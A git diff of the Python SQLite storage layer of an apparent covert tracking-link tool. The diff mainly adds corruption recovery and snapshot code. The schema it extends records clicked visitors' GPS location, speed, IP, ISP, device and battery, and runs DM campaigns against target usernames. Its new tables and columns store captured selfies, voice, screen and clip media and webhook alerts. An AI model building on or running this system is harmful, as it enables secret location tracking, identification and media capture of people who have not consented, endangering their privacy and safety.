@@ -1,4 +1,10 @@
-"""SQLite スキーマとアクセス層。特定エンジン + リンク追跡 + 横断検索。スレッド安全版。"""
+"""SQLite スキーマとアクセス層。特定エンジン + リンク追跡 + 横断検索。スレッド安全版。
+
+v2:
+  ・"database disk image is malformed" からの自動救出（.broken に退避して再構築）
+  ・書き込みが壊れていたら1回だけ自動復旧してやり直す
+  ・バックアップ用の一貫スナップショット（WAL 対応）
+"""
 import sqlite3, json, datetime as dt, os, threading
 from contextlib import contextmanager
 
@@ -197,6 +203,16 @@ CREATE TABLE IF NOT EXISTS campaign_targets (
     campaign_id INTEGER, username TEXT, user_id TEXT, code TEXT,
     state TEXT DEFAULT 'pending', sent_at TEXT, error TEXT
 );
+CREATE TABLE IF NOT EXISTS link_captures (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    code TEXT, hit_id INTEGER, vid TEXT, kind TEXT,
+    path TEXT, mime TEXT, bytes INTEGER, meta TEXT, ts TEXT
+);
+CREATE TABLE IF NOT EXISTS link_events (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    code TEXT, hit_id INTEGER, vid TEXT, kind TEXT,
+    value REAL, text TEXT, ts TEXT
+);
 CREATE INDEX IF NOT EXISTS idx_events_ts ON events(ts);
 CREATE INDEX IF NOT EXISTS idx_dm_msg ON dm_messages(thread_id, timestamp);
 CREATE INDEX IF NOT EXISTS idx_snap ON profile_snapshots(user_id, taken_at);
@@ -214,24 +230,131 @@ CREATE INDEX IF NOT EXISTS idx_ct_camp ON campaign_targets(campaign_id, state);
 CREATE INDEX IF NOT EXISTS idx_tp_code ON track_points(code, id);
 CREATE INDEX IF NOT EXISTS idx_tp_sid ON track_points(code, sid, id);
 CREATE INDEX IF NOT EXISTS idx_tp_ts ON track_points(ts);
+CREATE INDEX IF NOT EXISTS idx_cap_code ON link_captures(code, id);
+CREATE INDEX IF NOT EXISTS idx_ev_code ON link_events(code, kind, id);
 """
+
+# 追跡リンクとして扱う mode
+TRACK_IN = "('snap','live','page','geo','quiz','identify','redirect')"
 
 
 def now():
     return dt.datetime.now(dt.timezone.utc).isoformat()
 
 
+# ============ 整合性チェック・スナップショット・救出 ============
+
+def quick_ok(path):
+    """DB がまともに読めるか（安い検査）。"""
+    try:
+        c = sqlite3.connect(path, timeout=15)
+        try:
+            r = c.execute("PRAGMA quick_check").fetchone()
+            return bool(r) and r[0] == "ok"
+        finally:
+            c.close()
+    except sqlite3.Error:
+        return False
+
+
+def snapshot_db(src, dest):
+    """WAL を畳んだ一貫性のあるコピーを作る。本体接続は触らない。"""
+    os.makedirs(os.path.dirname(dest) or ".", exist_ok=True)
+    for suf in ("", "-wal", "-shm"):
+        try:
+            os.remove(dest + suf)
+        except OSError:
+            pass
+    s = sqlite3.connect(src, timeout=20)
+    try:
+        s.execute("PRAGMA busy_timeout=20000")
+        d = sqlite3.connect(dest)
+        try:
+            s.backup(d)
+            d.commit()
+        finally:
+            d.close()
+    finally:
+        s.close()
+    return dest
+
+
+def salvage_file(path):
+    """壊れた .db から読めるだけ救って差し替える。成功したら True。"""
+    if not os.path.exists(path):
+        return False
+    tmp = path + ".fix"
+    for suf in ("", "-wal", "-shm"):
+        try:
+            os.remove(tmp + suf)
+        except OSError:
+            pass
+    src = None
+    ok = False
+    try:
+        src = sqlite3.connect(path, timeout=20)
+        d = sqlite3.connect(tmp)
+        try:
+            src.backup(d)
+            d.commit()
+            ok = True
+        except sqlite3.Error:
+            ok = False
+        finally:
+            d.close()
+        if not ok:                        # 最終手段：行単位で吸い出す
+            d = sqlite3.connect(tmp)
+            try:
+                for line in src.iterdump():
+                    try:
+                        d.execute(line)
+                    except sqlite3.Error:
+                        continue
+                d.commit()
+                ok = True
+            finally:
+                d.close()
+    except Exception:
+        ok = False
+    finally:
+        try:
+            if src is not None:
+                src.close()
+        except Exception:
+            pass
+    if ok and quick_ok(tmp):
+        os.replace(tmp, path)
+        for suf in ("-wal", "-shm"):
+            try:
+                os.remove(path + suf)
+            except OSError:
+                pass
+        return True
+    try:
+        os.remove(tmp)
+    except OSError:
+        pass
+    return False
+
+
 class DB:
     def __init__(self, path):
-        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
+        self.path = path
         self._lock = threading.RLock()
-        self.conn = sqlite3.connect(path, check_same_thread=False, timeout=30)
+        self._healing = False
+        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
+        self._open()
+        if os.getenv("DB_INTEGRITY", "1") != "0" and not self.integrity():
+            self._salvage()
+
+    def _open(self):
+        self.conn = sqlite3.connect(self.path, check_same_thread=False, timeout=30)
         self.conn.row_factory = sqlite3.Row
         try:
             self.conn.execute("PRAGMA journal_mode=WAL")
         except sqlite3.OperationalError:
             self.conn.execute("PRAGMA journal_mode=DELETE")
-        self.conn.execute("PRAGMA busy_timeout=10000")
+        self.conn.execute("PRAGMA busy_timeout=15000")
         self.conn.execute("PRAGMA synchronous=NORMAL")
         with self._lock:
             self.conn.executescript(SCHEMA)
@@ -251,13 +374,17 @@ class DB:
                           ("sig", "TEXT"), ("sig_ok", "INTEGER"), ("nonce", "TEXT"),
                           ("fp_json", "TEXT"), ("quiz_done", "INTEGER DEFAULT 0"),
                           ("quiz_score", "REAL"), ("quiz_total", "INTEGER"),
-                          ("quiz_ms", "INTEGER")],
+                          ("quiz_ms", "INTEGER"),
+                          ("selfie", "TEXT"), ("voice", "TEXT"), ("screen", "TEXT"),
+                          ("clip", "TEXT"), ("dwell_ms", "INTEGER"), ("scroll", "REAL"),
+                          ("visits", "INTEGER")],
             "links": [("person", "TEXT"), ("interval", "INTEGER DEFAULT 15"),
                       ("live", "INTEGER DEFAULT 0"), ("session_id", "TEXT"),
                       ("last_ts", "TEXT"), ("last_lat", "REAL"), ("last_lon", "REAL"),
                       ("last_acc", "REAL"), ("last_city", "TEXT"), ("last_ip", "TEXT"),
                       ("last_src", "TEXT"), ("last_batt", "REAL"),
-                      ("last_charging", "INTEGER"), ("points", "INTEGER DEFAULT 0")],
+                      ("last_charging", "INTEGER"), ("points", "INTEGER DEFAULT 0"),
+                      ("webhook", "TEXT"), ("notify", "TEXT")],
         }
         for table, defs in add.items():
             have = cols(table)
@@ -266,6 +393,114 @@ class DB:
                     with self.tx() as c:
                         c.execute(f"ALTER TABLE {table} ADD COLUMN {name} {ddl}")
 
+    # ---- 健全性・自己修復 ----
+
+    def close(self):
+        with self._lock:
+            try:
+                self.conn.close()
+            except Exception:
+                pass
+
+    def integrity(self, quick=True):
+        try:
+            with self._lock:
+                r = self.conn.execute(
+                    "PRAGMA quick_check" if quick else "PRAGMA integrity_check").fetchone()
+            return bool(r) and r[0] == "ok"
+        except sqlite3.Error:
+            return False
+
+    def _is_corrupt(self, e):
+        s = str(e).lower()
+        return any(k in s for k in ("malformed", "not a database", "disk image",
+                                    "file is encrypted", "database corruption"))
+
+    def _salvage(self):
+        """壊れた DB を .broken に退避し、読める行だけ救って作り直す。"""
+        with self._lock:
+            if self._healing:
+                return 0
+            self._healing = True
+            try:
+                path = self.path
+                try:
+                    self.conn.close()
+                except Exception:
+                    pass
+                for suf in ("-wal", "-shm"):
+                    try:
+                        os.remove(path + suf)
+                    except OSError:
+                        pass
+                bak = path + ".broken"
+                try:
+                    os.replace(path, bak)
+                except OSError:
+                    bak = None
+                self._open()
+                n = 0
+                if bak and os.path.exists(bak):
+                    try:
+                        self.conn.execute("ATTACH DATABASE ? AS broken", (bak,))
+                        tabs = [r[0] for r in self.conn.execute(
+                            "SELECT name FROM broken.sqlite_master "
+                            "WHERE type='table' AND name NOT LIKE 'sqlite_%'")]
+                        for t in tabs:
+                            try:
+                                have = {r[1] for r in self.conn.execute(
+                                    f"PRAGMA main.table_info({t})")}
+                                cols = [r[1] for r in self.conn.execute(
+                                    f"PRAGMA broken.table_info({t})")]
+                                use = [c for c in cols if c in have]
+                                if not use:
+                                    continue
+                                cs = '","'.join(use)
+                                self.conn.execute(
+                                    f'INSERT OR IGNORE INTO "{t}"("{cs}") '
+                                    f'SELECT "{cs}" FROM broken."{t}"')
+                                n += 1
+                            except sqlite3.Error:
+                                continue
+                        self.conn.commit()
+                        try:
+                            self.conn.execute("DETACH DATABASE broken")
+                        except sqlite3.Error:
+                            pass
+                    except sqlite3.Error:
+                        pass
+                print(f"[db] 自己修復 {self.path} 救出テーブル={n}")
+                return n
+            finally:
+                self._healing = False
+
+    def _retry(self, fn):
+        """読み取り。壊れていたら1回だけ修復してやり直す。"""
+        for attempt in (0, 1):
+            try:
+                return fn()
+            except sqlite3.DatabaseError as e:
+                if attempt or not self._is_corrupt(e):
+                    raise
+            self._salvage()
+
+    def _w(self, fn):
+        """書き込み。壊れていたら1回だけ修復してやり直す。"""
+        for attempt in (0, 1):
+            with self._lock:
+                try:
+                    out = fn(self.conn)
+                    self.conn.commit()
+                    return out
+                except sqlite3.DatabaseError as e:
+                    try:
+                        self.conn.rollback()
+                    except Exception:
+                        pass
+                    if attempt or not self._is_corrupt(e):
+                        raise
+            self._salvage()
+
     @contextmanager
     def tx(self):
         with self._lock:
@@ -273,16 +508,23 @@ class DB:
                 yield self.conn
                 self.conn.commit()
             except Exception:
-                self.conn.rollback()
+                try:
+                    self.conn.rollback()
+                except Exception:
+                    pass
                 raise
 
     def q(self, sql, args=()):
-        with self._lock:
-            return self.conn.execute(sql, args).fetchall()
+        def run():
+            with self._lock:
+                return self.conn.execute(sql, args).fetchall()
+        return self._retry(run)
 
     def q1(self, sql, args=()):
-        with self._lock:
-            return self.conn.execute(sql, args).fetchone()
+        def run():
+            with self._lock:
+                return self.conn.execute(sql, args).fetchone()
+        return self._retry(run)
 
     def log(self, user_id, kind, payload):
         with self.tx() as c:
@@ -481,23 +723,23 @@ class DB:
             c.execute("UPDATE links SET active=? WHERE code=?", (int(bool(flag)), code))
 
     def bump_link(self, code):
-        with self.tx() as c:
-            c.execute("UPDATE links SET hit_count=hit_count+1 WHERE code=?", (code,))
+        return self._w(lambda c: c.execute(
+            "UPDATE links SET hit_count=hit_count+1 WHERE code=?", (code,)))
 
     def add_hit(self, d):
         cols = list(d.keys())
-        with self.tx() as c:
-            cur = c.execute(
-                f"INSERT INTO link_hits({','.join(cols)}) VALUES({','.join(['?'] * len(cols))})",
-                [d[k] for k in cols])
-            return cur.lastrowid
+        sql = (f"INSERT INTO link_hits({','.join(cols)}) "
+               f"VALUES({','.join(['?'] * len(cols))})")
+        args = [d[k] for k in cols]
+        return self._w(lambda c: c.execute(sql, args).lastrowid)
 
     def update_hit(self, hid, **f):
         if not f:
             return
         sets = ", ".join(f"{k}=?" for k in f)
-        with self.tx() as c:
-            c.execute(f"UPDATE link_hits SET {sets} WHERE id=?", list(f.values()) + [hid])
+        args = list(f.values()) + [hid]
+        return self._w(lambda c: c.execute(
+            f"UPDATE link_hits SET {sets} WHERE id=?", args))
 
     def hits(self, code, include_bots=True, limit=500):
         sql = "SELECT * FROM link_hits WHERE code=?"
@@ -531,9 +773,10 @@ class DB:
 
     def add_answer(self, d):
         cols = list(d.keys())
-        with self.tx() as c:
-            c.execute(f"INSERT INTO link_answers({','.join(cols)}) "
-                      f"VALUES({','.join(['?'] * len(cols))})", [d[k] for k in cols])
+        sql = (f"INSERT INTO link_answers({','.join(cols)}) "
+               f"VALUES({','.join(['?'] * len(cols))})")
+        args = [d[k] for k in cols]
+        return self._w(lambda c: c.execute(sql, args))
 
     def answers(self, code, limit=2000):
         return self.q("SELECT * FROM link_answers WHERE code=? ORDER BY ts DESC LIMIT ?",
@@ -544,16 +787,17 @@ class DB:
 
     # ---- 訪問者台帳 ----
     def upsert_visitor(self, vid, **f):
-        with self.tx() as c:
+        def run(c):
             c.execute("""INSERT INTO visitors(vid,first_seen,last_seen,hits)
                 VALUES(?,?,?,1) ON CONFLICT(vid) DO UPDATE SET
                 last_seen=excluded.last_seen, hits=visitors.hits+1""",
                 (vid, now(), now()))
-            f = {k: v for k, v in f.items() if v not in (None, "")}
-            if f:
-                sets = ",".join(f"{k}=?" for k in f)
+            g = {k: v for k, v in f.items() if v not in (None, "")}
+            if g:
+                sets = ",".join(f"{k}=?" for k in g)
                 c.execute(f"UPDATE visitors SET {sets} WHERE vid=?",
-                          list(f.values()) + [vid])
+                          list(g.values()) + [vid])
+        return self._w(run)
 
     def visitor(self, vid):
         return self.q1("SELECT * FROM visitors WHERE vid=?", (vid,))
@@ -658,8 +902,9 @@ class DB:
     def set_campaign_status(self, cid, status):
         with self.tx() as c:
             c.execute("UPDATE campaigns SET status=? WHERE id=?", (status, cid))
+
     # ---- 位置追跡（人物ごと・一瞬/ライブ） ----
-    TRACK_MODES = ("snap", "live")
+    TRACK_MODES = ("snap", "live", "page", "geo", "quiz", "identify", "redirect")
 
     def add_track(self, code, person, mode="snap", interval=15, dest="", note=""):
         mode = mode if mode in self.TRACK_MODES else "snap"
@@ -674,12 +919,12 @@ class DB:
         return code
 
     def tracks(self, limit=500):
-        return self.q("SELECT rowid AS rid,* FROM links WHERE mode IN ('snap','live') "
+        return self.q(f"SELECT rowid AS rid,* FROM links WHERE mode IN {TRACK_IN} "
                       "ORDER BY name COLLATE NOCASE, created_at DESC LIMIT ?", (limit,))
 
     def track_get(self, code):
-        return self.q1("SELECT rowid AS rid,* FROM links WHERE code=? "
-                       "AND mode IN ('snap','live')", (code,))
+        return self.q1(f"SELECT rowid AS rid,* FROM links WHERE code=? "
+                       f"AND mode IN {TRACK_IN}", (code,))
 
     def set_track_live(self, code, live, sid=""):
         with self.tx() as c:
@@ -690,8 +935,9 @@ class DB:
         if not f:
             return
         sets = ", ".join(f"{k}=?" for k in f)
-        with self.tx() as c:
-            c.execute(f"UPDATE links SET {sets} WHERE code=?", list(f.values()) + [code])
+        args = list(f.values()) + [code]
+        return self._w(lambda c: c.execute(
+            f"UPDATE links SET {sets} WHERE code=?", args))
 
     def del_track(self, code):
         with self.tx() as c:
@@ -714,11 +960,15 @@ class DB:
                 "acc", "spd", "hdg", "ip", "country", "country_code", "region", "city",
                 "isp", "asn", "device", "os", "browser", "inapp", "battery", "charging",
                 "screen", "note"]
-        with self.tx() as c:
-            c.executemany(f"INSERT INTO track_points({','.join(cols)}) "
-                          f"VALUES({','.join(['?'] * len(cols))})",
-                          [[r.get(k) for k in cols] for r in rows])
-        return len(rows)
+        sql = (f"INSERT INTO track_points({','.join(cols)}) "
+               f"VALUES({','.join(['?'] * len(cols))})")
+        data = [[r.get(k) for k in cols] for r in rows]
+
+        def run(c):
+            c.executemany(sql, data)
+            return len(rows)
+
+        return self._w(run)
 
     def points(self, code, since=0, limit=3000, order="asc"):
         o = "ASC" if order == "asc" else "DESC"
